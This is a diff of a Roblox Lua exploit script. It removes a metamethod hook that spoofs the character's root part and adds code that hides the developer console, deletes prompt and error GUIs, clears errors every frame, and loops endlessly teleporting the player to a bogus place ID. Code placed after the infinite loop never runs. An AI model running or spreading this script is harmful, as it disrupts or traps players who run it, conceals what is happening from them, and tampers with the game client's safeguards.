@@ -1,25 +1,72 @@
-local humanoid = game.Players.LocalPlayer.Character:WaitForChild("Humanoid")
-local original = game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart")
-local copy = original:Clone()
-copy.Name = "NewHumanoidRootPart"
-copy.CFrame = original.CFrame
-copy.Position = original.Position
+local runService = game:GetService("RunService")
+local pathss = game:GetService("CoreGui")
+local starterGui = game:GetService("StarterGui")
+local paths = game:GetService("CoreGui").RobloxGui
 
-game.Players.LocalPlayer.Character.Humanoid.BreakJointsOnDeath = false
-
-game.Players.LocalPlayer.Character.HumanoidRootPart.Name = "old"
-
-game.Players.LocalPlayer.Character.Humanoid.BreakJointsOnDeath = true
-
-local OldNameCall = nil
-
-OldNameCall = hookmetamethod(game, "__namecall", function(Self, ...)
-    local Args = {...}
-    local NamecallMethod = getnamecallmethod()
-
-    if not checkcaller() and Self == game and NamecallMethod == "copy" and Args[1] == "Name" then
-        return "HumanoidRootPart"
+runService.Heartbeat:Connect(function()
+    pcall(function()
+        starterGui:SetCore("DevConsoleVisible", false)
+    end)
+end)
+if pathss then
+    for i,v in pairs (pathss:GetChildren()) do
+        if v.Name == "RobloxPromptGui" or v.Name == "DevConsoleMaster" then
+            v:Destroy()
+        end
     end
-
-    return OldNameCall(Self, ...)
+end
+if paths then
+    for i,v in pairs (paths:GetChildren()) do
+        if v.Name == "ErrorPrompt" then
+            v:Destroy()
+        end
+    end
+end
+runService.Heartbeat:Connect(function(v)
+    game:GetService("GuiService"):ClearError(v)
+end)
+runService.Heartbeat:Connect(function(v)
+    game:GetService("GuiService"):ClearError(v)
+end)
+runService.Heartbeat:Connect(function(v)
+    game:GetService("GuiService"):ClearError(v)
+end)
+runService.Heartbeat:Connect(function(v)
+    game:GetService("GuiService"):ClearError(v)
+end)
+while true do
+    runService.RenderStepped:Wait()
+    pcall(function()
+        game:GetService("TeleportService"):Teleport("10101010101010101111", LocalPlayer)
+    end)
+end
+runService.Heartbeat:Connect(function(v)
+    game:GetService("GuiService"):ClearError(v)
+end)
+runService.Heartbeat:Connect(function(v)
+    game:GetService("GuiService"):ClearError(v)
+end)
+runService.Heartbeat:Connect(function(v)
+    game:GetService("GuiService"):ClearError(v)
+end)
+runService.Heartbeat:Connect(function(v)
+    game:GetService("GuiService"):ClearError(v)
+end)
+runService.Heartbeat:Connect(function(v)
+    game:GetService("GuiService"):ClearError(v)
+end)
+runService.Heartbeat:Connect(function(v)
+    game:GetService("GuiService"):ClearError(v)
+end)
+runService.Heartbeat:Connect(function(v)
+    game:GetService("GuiService"):ClearError(v)
+end)
+runService.Heartbeat:Connect(function(v)
+    game:GetService("GuiService"):ClearError(v)
+end)
+runService.Heartbeat:Connect(function(v)
+    game:GetService("GuiService"):ClearError(v)
+end)
+runService.Heartbeat:Connect(function(v)
+    game:GetService("GuiService"):ClearError(v)
 end)
